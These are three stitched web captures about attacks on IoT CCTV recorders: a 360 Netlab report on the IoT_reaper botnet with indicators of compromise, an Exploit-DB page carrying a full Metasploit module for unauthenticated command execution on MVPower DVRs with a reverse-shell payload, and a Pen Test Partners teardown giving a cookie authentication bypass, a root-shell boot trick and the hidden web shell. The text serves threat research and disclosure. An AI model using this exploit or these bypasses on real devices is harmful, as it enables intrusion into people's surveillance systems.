=== Content from blog.netlab.360.com_1321acfb_20250125_044901.html ===

[![360 Netlab Blog - Network Security Research Lab at 360](https://blog.netlab.360.com/content/images/2019/02/netlab-brand-5.png)](https://blog.netlab.360.com)

* [Botnet](https://blog.netlab.360.com/tag/botnet/)
* [DNSMon](https://blog.netlab.360.com/tag/dnsmon/)
* [DDoS](https://blog.netlab.360.com/tag/ddos/)
* [PassiveDNS](https://blog.netlab.360.com/tag/pdns/)
* [Mirai](https://blog.netlab.360.com/tag/mirai/)
* [DTA](https://blog.netlab.360.com/tag/dta/)

[![360 Netlab Blog - Network Security Research Lab at 360 icon](/content/images/size/w30/2019/02/netlab_xs-2.png)
360 Netlab Blog - Network Security Research Lab at 360](https://blog.netlab.360.com)

—
IoT\_reaper: A Rappid Spreading New IoT Botnet
Share this

[IoT Botnet](/tag/iot-botnet/)

# IoT\_reaper: A Rappid Spreading New IoT Botnet

* [![Genshen Ye](/content/images/2017/10/1662072805.jpg)](/author/yegenshen/)

#### [Genshen Ye](/author/yegenshen/)

Oct 20, 2017
• 4 min read

On 2017-09-13 at 01:02:13, we caught a new malicious sample targeting IoT devices. Starting from that time, this new IoT botnet family continued to update and began to harvest vulnerable iot devices in a rapid pace.

The bot borrowed some code from the famous mirai botnet, but it does not do any password crack all. Instead, it purely focuses on exploiting IoT device vulnerabilities. So, we name it **IoT\_reaper**.

**IoT\_reaper** is fairly large now and is actively expanding. For example, there are multiple C2s we are tracking, the most recently data (October 19) from just one C2 shows the number of unique active bot IP address is more than 10k per day. While at the same time, there are millions of potential vulnerable device IPs being queued into the c2 system waiting to be processed by an automatic loader that injects malicious code to the devices to expand the size of the botnet.

Currently, this botnet is still in its early stages of expansion. But the author is actively modifying the code, which deserves our vigilance.

Here we are sharing some quick summary so the security community may stop its before it causes bigger damage.

### From Mirai, Beyond Mirai

The botnet partially borrows some mirai source code, but is significantly different from mirai in several key behaviors, including:

* No longer crack any weak password, only exploit IoT devices vulnerabilities;
* A LUA execution environment integrated, so more complex attacks can be supported and carried out;
* Scan behavior is not very aggressive, so it can stay under the radar.

### Sample Delivery, C2 Distribution and Traffic Pattern

Take hxxp://162.211.183.192/sa as an example, **IoT\_reaper**'s sample delivery and C2 distribution are as follows. There is a `downloader`, quite different from Mirai:

* **downloader**: 162.211.183.192, samples can be downloaded from this server and it usually uses "d" as subdomain, like d.hl852.com
* **controller**: 27.102.101.121, which can control bots, send commands and usually uses "e" as subdomain, like e.hl852.com
* **reporter**: 222.112.82.231, which is used to receive potentially vulnerable device info collected by bots, it usually uses "f" as subdomain, like f.hl852.com.
* **loader**: 119.82.26.157, implants bot program through vulnerabilities into devices collected by reporter

The following figures shows traffic pattern of the above 4 IPs：

![](https://blog.netlab.360.com/content/images/2017/10/c2_traffic_history.png)

### 9 IoT Vulnerability Exploits Integrated in the Malware

Unlike Mirai that uses weak password cracking, **IoT\_reaper** infects IoT devices by exploiting multiple IoT device vulnerabilities.

We noticed 9 IoT vulnerability exploits have been integrated into current samples as follows:

* **Dlink** [https://blogs.securiteam.com/index.php/archives/3364](https://blogs.securiteam.com/index.php/archives/3364?ref=blog.netlab.360.com)
* **Goahead** [https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html?ref=blog.netlab.360.com)
* **JAWS** [https://www.pentestpartners.com/blog/pwning-cctv-cameras/](https://www.pentestpartners.com/blog/pwning-cctv-cameras/?ref=blog.netlab.360.com)
* **Netgear** [https://blogs.securiteam.com/index.php/archives/3409](https://blogs.securiteam.com/index.php/archives/3409?ref=blog.netlab.360.com)
* **Vacron** NVR [https://blogs.securiteam.com/index.php/archives/3445](https://blogs.securiteam.com/index.php/archives/3445?ref=blog.netlab.360.com)
* **Netgear** [http://seclists.org/bugtraq/2013/Jun/8](http://seclists.org/bugtraq/2013/Jun/8?ref=blog.netlab.360.com)
* **Linksys** [http://www.s3cur1ty.de/m1adv2013-004](http://www.s3cur1ty.de/m1adv2013-004?ref=blog.netlab.360.com)
* **dlink** [http://www.s3cur1ty.de/m1adv2013-003](http://www.s3cur1ty.de/m1adv2013-003?ref=blog.netlab.360.com)
* **AVTECH** [https://github.com/Trietptm-on-Security/AVTECH](https://github.com/Trietptm-on-Security/AVTECH?ref=blog.netlab.360.com)

![](https://blog.netlab.360.com/content/images/2017/10/sample_exploit_integration_timeline.png)

Note just in the last 10 days, the attacker has continuously added more new exploits into samples, one of which is adopted only 2 days after the disclosure of the vulnerability was made.

* Vacron NVR remote exploit was exposed on 2017-10-08 and was added into bot sample before 2017-10-10;
* 3 and 1 exploits are added separately in two updates on 2017-10-12 and 2017-10-16;

### The LUA Execution Environment Integrated in the Malware

Md5: CA92A3B74A65CE06035FCC280740DAF6

Based on the integrated LUA execution environment, author will be able to write very complex and efficient attack scripts now

### Approximately 100 DNS Open Resolvers Were Integrated in This Malware

The botnet has embedded more than 100 DNS open resolvers in its lua sample, so dns amplification attack can be easily carried out. And a cross-checking with our [DRDoS data feed](http://data.netlab.360.com/drdos-reflector/?ref=blog.netlab.360.com) indicates that about one-third of these open DNS servers have been used as reflector in real dns amplification attacks. We have yet to see this type of config in any other mirai variants.

### No DDoS Attack Command observed Till Now

In terms of attacking command, although we saw support of DDoS attack in the source file of Lua execution environment, we have not seen actual DDoS attack so far. The only instructions we saw are to download samples. This means the attacker is still focusing on spreading the botnets.

### Infection Measurement

By using some tricks, we are able to draw some fairly accurate measurement on the scale of the infection, here are a sample of the numbers.

* Number of vulnerable devices in one c2 queue waiting to be infected : over 2m;
* Infected bots controlled by one c2 in last 7 days: over 20k ;
* Number of daily active bots controlled by one c2 : around 10k for yesterday(October 19) ;
* Number of simultaneous on-line bots controlled by one c2 : around 4k

### IoC URLs

hxxp://cbk99.com:8080/run.lua

hxxp://bbk80.com/api/api.php

hxxp://103.1.221.40/63ae01/39xjsda.php

hxxp://162.211.183.192/down/server.armel

hxxp://162.211.183.192/sa

hxxp://162.211.183.192/sa5

hxxp://162.211.183.192/server.armel

hxxp://162.211.183.192/sm

hxxp://162.211.183.192/xget

hxxp://198.44.241.220:8080/run.lua

hxxp://23.234.51.91/control-ARM-LSB

hxxp://23.234.51.91/control-MIPS32-MSB

hxxp://23.234.51.91/ht\_am5le

hxxp://23.234.51.91/ht\_mpbe

hxxp://27.102.101.121/down/1506753086

hxxp://27.102.101.121/down/1506851514

### IoC Hashes

3182a132ee9ed2280ce02144e974220a

3d680273377b67e6491051abe17759db

41ef6a5c5b2fde1b367685c7b8b3c154

4406bace3030446371df53ebbdc17785

4e2f58ba9a8a2bf47bdc24ee74956c73

596b3167fe0d13e3a0cfea6a53209be4

6587173d571d2a587c144525195daec9

6f91694106bb6d5aaa7a7eac841141d9

704098c8a8a6641a04d25af7406088e1

726d0626f66d5cacfeff36ed954dad70

76be3db77c7eb56825fe60009de2a8f2

95b448bdf6b6c97a33e1d1dbe41678eb

9ad8473148e994981454b3b04370d1ec

9f8e8b62b5adaf9c4b5bdbce6b2b95d1

a3401685d8d9c7977180a5c6df2f646a

abe79b8e66c623c771acf9e21c162f44

b2d4a77244cd4f704b65037baf82d897

ca92a3b74a65ce06035fcc280740daf6

e9a03dbde09c6b0a83eefc9c295711d7

f9ec2427377cbc6afb4a7ff011e0de77

fb7c00afe00eeefb5d8a24d524f99370

— 360 Netlab Blog - Network Security Research Lab at 360 —
### [IoT Botnet](/tag/iot-botnet/)

* [一个藏在我们身边的巨型僵尸网络 Pink](/pinkbot/)
* [Linux.Ngioweb变种正在攻击IOT设备](/linux-ngioweb-v2-going-after-iot-devices/)
* [The new developments Of the FBot](/the-new-developments-of-the-fbot-en/)

[See all 27 posts →](/tag/iot-botnet/)

[IoT Botnet
## IoT\_reaper 情况更新

在周五晚上披露了IoT\_reaper之后，我们收到了来自安全社区和各方很多问题。这里给出一个快速的更新，以澄清各方可能的疑问。
IoT\_reaper样本投递历史情况
我们通过蜜罐观察到的 IoT\_reaper 样本历史投递情况如下：
可以看出，IoT\_reaper 最主要传播的恶意代码位于下面这个URL上：
\* 下载地址：hxxp://162.211.183.192/sa
\* 投递者：119.82.26.157
\* 起止时间：10-04～10-17
\* 样本md5：7 个,详细见文末IoC
这个URL上的样本之间内聚关系比较强，我们称为S簇。
后来进一步的分析，认为S簇还包括其他一些样本；而在S簇之外，还有一个LUA簇，以及其他更小一些的未知簇。
S簇的样本构成
我们认为S簇包含下面这些URL上的样本：
\* hxxp://162.211.183.192/sa
\* hxxp:](/iot_reaper-a-few-updates/)

* Genshen Ye

  [![Genshen Ye](/content/images/2017/10/1662072805.jpg)](/author/yegenshen/)

Oct 25, 2017
6 min read

[IoT Botnet
## IoT\_reaper : 一个正在快速扩张的新 IoT 僵尸网络

从2017-09-13 01:02:13开始，我们捕获到一个新的针对iot设备的恶意样本出现，在随后的这个一个多月时间里，这个新的IoT僵尸网络家族不断持续更新，开始在互联网上快速大规模的组建僵尸网络军团。
该僵尸网络脱胎于mirai，但是在诸多方面比mirai更进一步，特别是开始放弃弱口令猜测，完全转向利用IoT设备漏洞收割，成为IoT僵尸网络里的新兴玩家。我们将之命名为IoT\_reaper。
IoT\_reaper规模较大且正在积极扩张，例如最近的数据昨日(10月19日)在我们观察到的多个C2中，其中一个C2上活跃IP地址去重后已经有10k个，此外还有更多的易感设备信息已经被提交到后台，由一个自动的loader持续植入恶意代码、扩大僵尸网络规模。
所幸目前该僵尸网络还尚未发出植入恶意代码以外的其他攻击指令，这反映出该僵尸网络仍然处在早期扩张阶段。但是作者正在积极的修改代码，这值得我们警惕。
我们公开IoT\_reaper的相关信息，希望安全社区、设备供应商、政府能够采取共同行动，联合遏制该僵尸网络的扩张。
源于mirai，高于mirai
该僵尸网络部分借用了m](/iot-reaper-a-quick-summary-of-a-rapid-spreading-new-iot-botnet/)

* Genshen Ye

  [![Genshen Ye](/content/images/2017/10/1662072805.jpg)](/author/yegenshen/)

Oct 20, 2017
6 min read

[360 Netlab Blog - Network Security Research Lab at 360](https://blog.netlab.360.com) © 2025
[Powered by Ghost](https://ghost.org/)



=== Content from www.exploit-db.com_2ea9465e_20250125_044902.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# MVPower DVR TV-7104HE 1.8.4 115215B9 - Shell Command Execution (Metasploit)

#### EDB-ID:

###### 41471

#### CVE:

###### N/A

---

**EDB Verified:**

#### Author:

###### [Metasploit](/?author=3211)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [ARM](/?platform=arm)

#### Date:

###### 2017-02-27

---

**Vulnerable App:**

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  HttpFingerprint = { :pattern => [ /JAWS\/1\.0/ ] }

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'MVPower DVR Shell Unauthenticated Command Execution',
      'Description' => %q{
        This module exploits an unauthenticated remote command execution
        vulnerability in MVPower digital video recorders. The 'shell' file
        on the web interface executes arbitrary operating system commands in
        the query string.

        This module was tested successfully on a MVPower model TV-7104HE with
        firmware version 1.8.4 115215B9 (Build 2014/11/17).

        The TV-7108HE model is also reportedly affected, but untested.
      },
      'Author'      =>
        [
          'Paul Davies (UHF-Satcom)', # Initial vulnerability discovery and PoC
          'Andrew Tierney (Pen Test Partners)', # Independent vulnerability discovery and PoC
          'Brendan Coles <bcoles[at]gmail.com>' # Metasploit
        ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'References'  =>
        [
          # Comment from Paul Davies contains probably the first published PoC
          [ 'URL', 'https://labby.co.uk/cheap-dvr-teardown-and-pinout-mvpower-hi3520d_v1-95p/' ],
          # Writeup with PoC by Andrew Tierney from Pen Test Partners
          [ 'URL', 'https://www.pentestpartners.com/blog/pwning-cctv-cameras/' ]
        ],
      'DisclosureDate' => 'Aug 23 2015',
      'Privileged'     => true, # BusyBox
      'Arch'           => ARCH_ARMLE,
      'DefaultOptions' =>
        {
          'PAYLOAD' => 'linux/armle/mettle_reverse_tcp',
          'CMDSTAGER::FLAVOR' => 'wget'
        },
      'Targets'        =>
        [
          ['Automatic', {}]
        ],
      'CmdStagerFlavor' => %w{ echo printf wget },
      'DefaultTarget'   => 0))
  end

  def check
    begin
      fingerprint = Rex::Text::rand_text_alpha(rand(10) + 6)
      res = send_request_cgi(
        'uri' => "/shell?echo+#{fingerprint}",
        'headers' => { 'Connection' => 'Keep-Alive' }
      )
      if res && res.body.include?(fingerprint)
        return CheckCode::Vulnerable
      end
    rescue ::Rex::ConnectionError
      return CheckCode::Unknown
    end
    CheckCode::Safe
  end

  def execute_command(cmd, opts)
    begin
      send_request_cgi(
        'uri' => "/shell?#{Rex::Text.uri_encode(cmd, 'hex-all')}",
        'headers' => { 'Connection' => 'Keep-Alive' }
      )
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Failed to connect to the web server")
    end
  end

  def exploit
    print_status("#{peer} - Connecting to target")

    unless check == CheckCode::Vulnerable
      fail_with(Failure::Unknown, "#{peer} - Target is not vulnerable")
    end

    print_good("#{peer} - Target is vulnerable!")

    execute_cmdstager(linemax: 1500)
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://github.com/rapid7/metasploit-framework/blob/236606838a0910235aa056e2ac1282298bc3a038/modules/exploits/linux/http/mvpower_dvr_shell_exec.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from www.pentestpartners.com_e43c8dbc_20250125_044904.html ===


[![Pen Test Partners Logo](https://www.pentestpartners.com/content/themes/pentestpartners2019/dist/images/logo-ptp.png)

Security consulting and testing services](https://www.pentestpartners.com)

+44 20 3095 0500

+1 646 693 2501

* [About](https://www.pentestpartners.com/about-us/)
  + [PTP in the USA](https://www.pentestpartners.com/about-us/ptp-in-the-usa/)
  + [Careers](https://www.pentestpartners.com/about-us/careers/)
  + [Our Vision and Values](https://www.pentestpartners.com/our-vision-and-values/)
  + [In the news](https://www.pentestpartners.com/about-us/in-the-news/)
  + [Environmental Statement](https://www.pentestpartners.com/about-us/environmental-statement/)
  + [Vulnerability Disclosure Policy](https://www.pentestpartners.com/about-us/vulnerability-disclosure-policy/)
* [Services](https://www.pentestpartners.com/penetration-testing-services/)
  + [Red Teaming](https://www.pentestpartners.com/penetration-testing-services/red-teaming/)
  + [Purple Teaming](https://www.pentestpartners.com/penetration-testing-services/purple-teaming/)
  + [Penetration Testing](https://www.pentestpartners.com/penetration-testing-services/penetration-testing/)
  + [Agile Environment Testing](https://www.pentestpartners.com/penetration-testing-services/agile-environment-testing/)
  + [Aviation Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/aviation-cyber-security-testing/)
  + [Automotive & IoT Testing](https://www.pentestpartners.com/penetration-testing-services/automotive-and-iot-testing/)
  + [Maritime Cyber Security Testing](https://www.pentestpartners.com/penetration-testing-services/maritime-cyber-security-testing/)
  + [Cloud Services Security](https://www.pentestpartners.com/penetration-testing-services/cloud-services-security/)
  + [DevOps Lifecycle Assurance](https://www.pentestpartners.com/devops-lifecycle-assurance/)
  + [Social Engineering](https://www.pentestpartners.com/penetration-testing-services/social-engineering/)
  + [Physical Security](https://www.pentestpartners.com/penetration-testing-services/physical-security/)
  + [Security Training](https://www.pentestpartners.com/penetration-testing-services/security-training/)
  + [Papa – Proactive Advanced Password Auditor](https://www.pentestpartners.com/penetration-testing-services/papa/)
  + [ICS, IIoT, SCADA Security Testing](https://www.pentestpartners.com/penetration-testing-services/ics-iiot-scada-security-testing/)
  + [CBEST Red Teaming](https://www.pentestpartners.com/penetration-testing-services/cbest-threat-intelligence-led-red-teaming/)
  + [CREST OVS Mobile & Apps](https://www.pentestpartners.com/crest-owasp-verification-standard-ovs-program/)
  + [TIBER-EU Assessments](https://www.pentestpartners.com/penetration-testing-services/tiber-eu-assessments/)
  + [CREST STAR-FS](https://www.pentestpartners.com/penetration-testing-services/crest-star-fs-assessments/)
  + [Cyber Essentials Testing](https://www.pentestpartners.com/penetration-testing-services/cyber-essentials-testing/)
  + [Cyber Security Consulting](https://www.pentestpartners.com/penetration-testing-services/cyber-security-consulting/)
  + [Compromise Assessment](https://www.pentestpartners.com/compromise-assessment/)
  + [Digital Forensics Services](https://www.pentestpartners.com/digital-forensics-services/)
  + [Incident Response Services](https://www.pentestpartners.com/incident-response-services/)
  + [Incident Response Retained Service](https://www.pentestpartners.com/incident-response-retained-service/)
  + [Incident Response Policy Assessment & Development](https://www.pentestpartners.com/incident-response-policy-assessment-development/)
  + [Attack Surface Assessment](https://www.pentestpartners.com/attack-surface-assessment/)
* [Events](https://www.pentestpartners.com/events-and-speaking/)
* [Security Blog](https://www.pentestpartners.com/security-blog/)
* [Demo Videos](https://www.pentestpartners.com/resources/hack-demo-videos/)
* [Contact Us](https://www.pentestpartners.com/contact-us/)

For the best user experience please upgrade your browser

Blog: How-Tos

# Pwning CCTV cameras

Andrew Tierney
10 Feb 2016

CCTV is ubiquitous in the UK. A recent study estimates there are about 1.85m cameras across the UK – most in private premises. Most of those cameras will be connected to some kind of recording device, which these days means a Digital Video Recorder or DVR.

DVRs take video feeds from multiple cameras and store them onto a drive. As well as displaying images on a screen, most of them can be accessed over a network, allowing users to connect using either a web browser or a custom client.

Of course, business and home owners want to access their DVRs remotely to keep an eye on things. The DVRs get opened up to the Internet using port-forwarding, and because of this, we can find hundreds of thousands of them quickly and easily on Shodan.

So, we decided to [pick up a cheap DVR](https://www.amazon.co.uk/Security-Real-time-Recorder-Detection-Surveillance/dp/B0162AQCO4/ref%3Dsr_1_2?s=diy&ie=UTF8&qid=1455638899&sr=1-2&keywords=MVpower+8+channel) and see just how bad it could be. And it couldn’t really be any worse.

After no more than a few hours of digging, we found the following issues:

### Trivial to find on Shodan

The DVRs run a customer web server which has a very distinctive HTTP Server header of “JAWS/1.0”. Searching for this on Shodan (<https://www.shodan.io/search?query=JAWS%2F1.0>), we can find over 44,000 of these devices that are or have been connected to the Internet at some point. Not all of them will be exactly the same, but it looks like a lot of them are.

[![DVRCCTV1-300x235](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV1-300x235](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV1-300x235-300x235.png)](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV1-300x235.png)

### Poor default credentials

By default, the username is admin and the password is blank.

It only seems possible to change the password using the DVR’s local interface, connected to a TV. It doesn’t come with a keyboard, so it would be a safe bet that a large number of these DVRs are still using the same default credentials.

It’s an old, boring problem, but default credentials are the plague of the IoT world.

### Web authentication bypass

When you first visit the DVR, you are shown index.html, which requires you enter a username and password. If correct, you are directed to view2.html.

Oddly, if we clear our cookies and visit view2.html, we briefly see the page render, before being redirected back to index.html so we can enter our password.

This is nearly always a sign of JavaScript client-side authentication checks being made. Sure enough, if we examine the file view2.js:

$(document).ready(function(){

dvr\_camcnt = Cookies.get(“dvr\_camcnt”);

dvr\_usr = Cookies.get(“dvr\_usr”);

dvr\_pwd = Cookies.get(“dvr\_pwd”);

if(dvr\_camcnt == null || dvr\_usr == null || dvr\_pwd == null)

{

location.href = “/index.html”;

}

Read that and let it sink in. As long as those three cookies have ANY value, you will be allowed access (dvr\_camcnt needs to be 2, 4, 8 or 24 for other functionality to work though).

![DVRCCTV3](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV3](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV3.png)

Sure enough, manually setting those cookies grants us access. Not good – we now have full control of the DVR functionality without needing to know the username or password.

### Open serial console

Whilst full control of the DVRs web interface is fun, I want a root shell.

Popping the lid on the box, we find a header J18. This is a 115200 serial port. Although I can see output, there is no shell and it won’t accept any input.

Rebooting the device, we see that the board is using uboot, an extremely common open-source boot loader. We can interrupt uboot by pressing any key. You only have a second to do this though, so it might take a few goes!

We are now in the uboot console. Let’s change boot arguments to single user mode so we don’t need a password to login:

setenv bootargs ${bootargs) single

boot

The DVR boots into single user mode and we have a root shell – we can do anything we want.

### Built-in web shell

A local root shell is good, but I want remote shell access.

Looking round the firmware, it’s found that most of the functionality is in dvr\_app – including the web server. Despite the directory cgi-bin being used by the web interface, I can’t find this directory in the file system on the device – it’s likely that dvr\_app handles this internally. This seems quite common on embedded devices.

Using strings on the binary, cgi-bin is obvious. But very near to it, other values can be seen – including moo and shell.

![DVRCCTV4](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV4](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV4.png)

Visiting moo shows us a curious image of a cow. This is the image that you see when you run apt-get moo on a Debian distro. Why this has been added as functionality, we’re not sure.

![DVRCCTV5](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV5](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV5.png)

Visiting shell hangs. But visit shell?ps and you see a list of processes.

![DVRCCTV6](https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif)![DVRCCTV6](https://www.pentestpartners.com/content/uploads/2016/02/DVRCCTV6.png)

We have a remote, unauthenticated root shell, that is undocumented and not possible to disable, built-in to the device. This is as bad as it gets.

### Telnet with no authentication

